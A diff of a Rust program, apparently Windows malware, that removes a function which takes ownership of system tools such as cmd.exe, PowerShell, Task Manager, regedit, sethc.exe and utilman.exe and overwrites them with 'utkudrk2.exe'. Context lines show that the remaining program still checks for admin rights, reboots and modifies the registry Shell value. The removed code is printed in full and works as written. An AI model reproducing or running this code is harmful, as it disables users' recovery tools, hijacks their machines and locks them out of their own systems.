@@ -159,77 +159,6 @@ fn reboot_system() -> io::Result<()> {
     Ok(())
 }
 
-fn replace_files() -> io::Result<()> {
-    let files_to_takeown = [
-        r"C:\Windows\System32\Taskmgr.exe",
-        r"C:\Windows\System32\perfmon.exe",
-        r"C:\Windows\System32\sethc.exe",
-        r"C:\Windows\System32\cmd.exe",
-        r"C:\Windows\System32\reg.exe",
-        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
-        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe",
-        r"C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe",
-        r"C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe",
-        r"C:\Windows\regedit.exe",
-        r"C:\Windows\System32\utilman.exe",
-    ];
-
-    // Process files to take ownership and replace them
-    for file in files_to_takeown.iter() {
-        println!("Processing: {}", file);
-
-        // Take ownership of the file
-        let output = Command::new("cmd")
-            .args(&["/C", &format!("takeown /f \"{}\"", file)])
-            .output()?;
-
-        if output.status.success() {
-            println!("Ownership taken for: {}", file);
-        } else {
-            eprintln!(
-                "Failed to take ownership of {}: {:?}",
-                file,
-                String::from_utf8_lossy(&output.stderr)
-            );
-            continue;
-        }
-
-        // Grant full permissions to the current user
-        let output = Command::new("cmd")
-            .args(&["/C", &format!("icacls \"{}\" /grant \"%username%\":F", file)])
-            .output()?;
-
-        if output.status.success() {
-            println!("Permissions granted for: {}", file);
-        } else {
-            eprintln!(
-                "Failed to grant permissions for {}: {:?}",
-                file,
-                String::from_utf8_lossy(&output.stderr)
-            );
-            continue;
-        }
-
-        // Replace the file with another executable (optional)
-        let replacement_file = r"C:\Program Files\utkudrk2\utkudrk2.exe"; // Example executable to replace with
-        let output = Command::new("cmd")
-            .args(&["/C", &format!("copy \"{}\" \"{}\" /Y", replacement_file, file)])
-            .output()?;
-
-        if output.status.success() {
-            println!("File replaced: {}", file);
-        } else {
-            eprintln!(
-                "Failed to replace {}: {:?}",
-                file,
-                String::from_utf8_lossy(&output.stderr)
-            );
-        }
-    }
-
-    Ok(())
-}
-
 fn main() {
     // Step 1: Admin Control Check
     if !is_admin() {
@@ -277,12 +206,7 @@ fn main() {
         eprintln!("Error rebooting system: {}", e);
     }
 
-    // Step 8: Replace files with utkudrk2.exe
-    if let Err(e) = replace_files() {
-        eprintln!("Error replacing files: {}", e);
-    }
-
-    // Step 9: Modify the registry to set Shell value
+    // Step 8: Modify the registry to set Shell value
     if let Err(e) = modify_registry() {
         eprintln!("Error modifying the registry: {}", e);
     }
